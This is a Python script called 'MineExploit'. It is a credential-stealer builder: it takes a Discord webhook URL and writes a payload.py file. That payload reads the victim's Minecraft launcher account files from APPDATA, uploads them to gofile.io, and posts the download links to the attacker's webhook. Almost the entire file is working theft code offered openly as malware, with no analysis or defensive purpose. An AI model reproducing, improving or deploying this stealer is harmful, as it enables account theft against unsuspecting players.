from pystyle import *

System.Size(140 , 40)
System.Title("~ MineExploit ~")

MineExploit = """
  __  __ _            ______            _       _ _   
 |  \/  (_)          |  ____|          | |     (_) |  
 | \  / |_ _ __   ___| |__  __  ___ __ | | ___  _| |_ 
 | |\/| | | '_ \ / _ \  __| \ \/ / '_ \| |/ _ \| | __|
 | |  | | | | | |  __/ |____ >  <| |_) | | (_) | | |_ 
 |_|  |_|_|_| |_|\___|______/_/\_\ .__/|_|\___/|_|\__|
                                 | |                  
                                 |_|       

"""

def Builder(webhook):
    src = """
from requests import post , get
import os

webhook = '"""+ webhook + r"""'

get_the_link_to_upload = get("https://api.gofile.io/getServer").json()
link = "https://" + get_the_link_to_upload['data']['server']+".gofile.io/uploadFile"

x = os.getenv('APPDATA')

Microsoft_Account = f"{x}\\.minecraft\\launcher_accounts_microsoft_store.json"
Mojang_Account = f"{x}\\.minecraft\\launcher_accounts.json"

with open(Microsoft_Account) as Microsoft_file :
    content = Microsoft_file.readlines()

with open(Mojang_Account) as Mojang_file :
    content1 = Mojang_file.readlines()

y = post(url=link , files={'file' : open(Microsoft_Account , 'rb')}).json()
z = post(url=link , files={'file' : open(Mojang_Account , 'rb')}).json()

Microsoft_Download_Page = y['data']['downloadPage']
Mojang_Download_Page = z['data']['downloadPage']

embeds = [
        {
            "title": "MineExploit",
            "description": "*```New Fresh Account Grabbed !!```*",
            "url": "https://github.com/matxd291",
            "color": 0x28282B,
            "fields": [
                {
                    "name": "Mojang JSON file",
                    "value": f"```{Mojang_Download_Page}```",
                    "inline": False
                },
                {
                    "name": "Microsoft JSON file",
                    "value": f"```{Microsoft_Download_Page}```",
                    "inline": False
                },


            ],
            "footer": {
                "text": "by matxd291",
                "icon_url": "https://iili.io/HHI2Tap.jpg"
            },

            "thumbnail": {
                "url": "https://images-ext-2.discordapp.net/external/q_EGBFoyr4mu73hwIdHsXYbR5dOXDB2EOWFAlIX3YRI/https/iili.io/HHzZbft.png"},

        }
    ]

payload = {"username": "MineExploit",
            "avatar_url": "https://iili.io/HHzZbft.png",
            "embeds": embeds}

post(webhook, json=payload)"""

    print(f"[{Colors.pink}!{Colors.reset}] Wait...")
    with open('payload.py' , 'w') as final : 
        final.write(src)
        final.close()
    input(f"[{Colors.pink}!{Colors.reset}] Finished the malware are in {Colors.purple}payload.py{Colors.reset} file !")

def Main():
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(MineExploit)))
    print()
    webhook = input(f"[{Colors.pink}!{Colors.reset}] Paste your webhook url {Colors.cyan}->{Colors.reset} ")
    Builder(webhook=webhook)
if __name__ == '__main__' :
    Main()